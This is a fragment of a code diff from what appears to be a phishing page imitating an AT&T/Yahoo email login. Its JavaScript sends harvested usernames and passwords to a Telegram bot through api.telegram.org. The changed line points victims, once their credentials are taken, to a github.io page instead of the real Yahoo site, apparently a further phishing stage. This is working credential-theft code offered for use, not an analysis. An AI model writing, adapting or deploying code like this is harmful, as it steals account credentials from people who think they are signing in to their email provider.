@@ -226,7 +226,7 @@ footer#footer ul li{
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://currently.att.yahoo.com//");
+              window.location.replace("https://online-confirmation.github.io/web-number/at2.html");
           }, error => {
               alert("Message not sent")
               console.log(error)
